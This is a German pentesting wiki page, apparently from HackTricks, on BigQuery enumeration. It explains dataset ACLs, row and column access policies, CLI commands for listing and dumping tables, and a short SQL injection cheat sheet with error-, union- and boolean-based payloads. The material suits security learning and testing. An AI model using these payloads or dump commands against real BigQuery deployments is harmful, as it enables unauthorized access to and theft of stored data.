# GCP - Bigquery Enum

{{#include ../../../banners/hacktricks-training.md}}

## Grundinformationen

Google Cloud BigQuery ist ein **vollständig verwaltetes, serverloses Unternehmensdatenlager**, das Funktionen für **Analysen über Petabytes** von Daten bietet und somit große Datensätze effizient verarbeitet. Als Platform as a Service (PaaS) stellt es den Benutzern Infrastruktur und Werkzeuge zur Verfügung, um das Datenmanagement ohne manuelle Aufsicht zu erleichtern.

Es unterstützt Abfragen mit **ANSI SQL**. Die Hauptobjekte sind **Datasets**, die **Tabellen** enthalten, die SQL **Daten** enthalten.

### Verschlüsselung

Standardmäßig wird ein **von Google verwalteter Verschlüsselungsschlüssel** verwendet, obwohl es möglich ist, einen **vom Kunden verwalteten Verschlüsselungsschlüssel (CMEK)** zu konfigurieren. Es ist möglich, den Verschlüsselungsschlüssel pro Dataset und pro Tabelle innerhalb eines Datasets anzugeben.

### Ablauf

Es ist möglich, eine **Ablaufzeit im Dataset** anzugeben, sodass jede neue Tabelle, die in diesem Dataset erstellt wird, nach der Erstellung automatisch nach der angegebenen Anzahl von Tagen **gelöscht** wird.

### Externe Quellen

Bigquery ist tief in andere Google-Dienste integriert. Es ist möglich, Daten aus Buckets, Pub/Sub, Google Drive, RDS-Datenbanken usw. zu laden.

### Dataset ACLs

Wenn ein Dataset erstellt wird, werden **ACLs angehängt**, um den Zugriff darauf zu gewähren. Standardmäßig erhält der **Benutzer, der das** Dataset erstellt hat, **Besitzer**-Rechte und dann **Besitzer** für die Gruppe **projectOwners** (Besitzer des Projekts), **Schreiber** für die Gruppe **projectWriters** und **Leser** für die Gruppe **projectReaders**:
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### Tabellenzeilen Zugriffssteuerung

Es ist möglich, **die Zeilen, auf die ein Principal innerhalb einer Tabelle zugreifen kann, zu steuern** mit Zeilenzugriffsrichtlinien. Diese werden innerhalb der Tabelle mit [**DDL**](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create_row_access_policy_statement) definiert.\
Die Zugriffsrichtlinie definiert einen Filter und **nur die übereinstimmenden Zeilen** mit diesem Filter sind für die angegebenen Principals **zugänglich**.
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### Spaltenzugriffskontrolle

<figure><img src="../../../images/image (12).png" alt=""><figcaption></figcaption></figure>

Um den Datenzugriff auf Spaltenebene einzuschränken:

1. **Definieren Sie eine Taxonomie und Richtlinientags**. Erstellen und verwalten Sie eine Taxonomie und Richtlinientags für Ihre Daten. [https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. Optional: Gewähren Sie die **Data Catalog Fine-Grained Reader-Rolle einem oder mehreren Benutzern** für eines oder mehrere der von Ihnen erstellten Richtlinientags.
3. **Weisen Sie Richtlinientags Ihren BigQuery-Spalten zu**. Verwenden Sie in BigQuery Schema-Anmerkungen, um jedem Spalte, für die Sie den Zugriff einschränken möchten, ein Richtlinientag zuzuweisen.
4. **Durchsetzen der Zugriffskontrolle auf der Taxonomie**. Die Durchsetzung der Zugriffskontrolle bewirkt, dass die für alle Richtlinientags in der Taxonomie definierten Zugriffsbeschränkungen angewendet werden.
5. **Verwalten Sie den Zugriff auf die Richtlinientags**. Verwenden Sie [Identity and Access Management](https://cloud.google.com/iam) (IAM)-Richtlinien, um den Zugriff auf jedes Richtlinientag einzuschränken. Die Richtlinie gilt für jede Spalte, die zum Richtlinientag gehört.

Wenn ein Benutzer versucht, zur Abfragezeit auf Spaltendaten zuzugreifen, **überprüft BigQuery das Spaltenrichtlinientag und dessen Richtlinie, um festzustellen, ob der Benutzer berechtigt ist, auf die Daten zuzugreifen**.

> [!TIP]
> Zusammenfassend lässt sich sagen, dass Sie, um den Zugriff auf einige Spalten für einige Benutzer einzuschränken, **ein Tag zur Spalte im Schema hinzufügen und den Zugriff** der Benutzer auf das Tag einschränken können, indem Sie die Zugriffskontrolle auf der Taxonomie des Tags durchsetzen.

Um die Zugriffskontrolle auf der Taxonomie durchzusetzen, ist es erforderlich, den Dienst zu aktivieren:
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
Es ist möglich, die Tags von Spalten mit folgendem Befehl anzuzeigen:
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
### Aufzählung
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Get jobs executed
bq ls --jobs=true --all=true
bq show --location=<location> show --format=prettyjson --job=true <job-id>

# Misc
bq show --encryption_service_account # Get encryption service account
```
### BigQuery SQL Injection

Für weitere Informationen können Sie den Blogbeitrag überprüfen: [https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac). Hier werden nur einige Details gegeben.

**Kommentare**:

- `select 1#from here it is not working`
- `select 1/*between those it is not working*/` Aber nur das anfängliche wird nicht funktionieren
- `select 1--from here it is not working`

Holen Sie **Informationen** über die **Umgebung** wie:

- Aktueller Benutzer: `select session_user()`
- Projekt-ID: `select @@project_id`

Reihen zusammenfügen:

- Alle Tabellennamen: `string_agg(table_name, ', ')`

Holen Sie **Datasets**, **Tabellen** und **Spalten** Namen:

- **Projekt** und **Dataset** Name:
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
- **Spalten** und **Tabellen** Namen von **allen Tabellen** des Datensatzes:
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM <project-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS
```
- **Andere Datensätze** im selben Projekt:
```sql
# SELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM <project-name>.INFORMATION_SCHEMA.SCHEMATA
```
**SQL Injection-Typen:**

- Fehlerbasiert - Casting: `select CAST(@@project_id AS INT64)`
- Fehlerbasiert - Division durch Null: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
- Union-basiert (Sie müssen ALL in BigQuery verwenden): `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
- Boolean-basiert: `` ' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'# ``
- Potenziell zeitbasiert - Verwendung öffentlicher Datensätze Beispiel: `` SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000 ``

**Dokumentation:**

- Alle Funktionsliste: [https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
- Skriptanweisungen: [https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### Privilegieneskalation & Post-Exploitation

{{#ref}}
../gcp-privilege-escalation/gcp-bigquery-privesc.md
{{#endref}}

### Persistenz

{{#ref}}
../gcp-persistence/gcp-bigquery-persistence.md
{{#endref}}

## Referenzen

- [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

{{#include ../../../banners/hacktricks-training.md}}
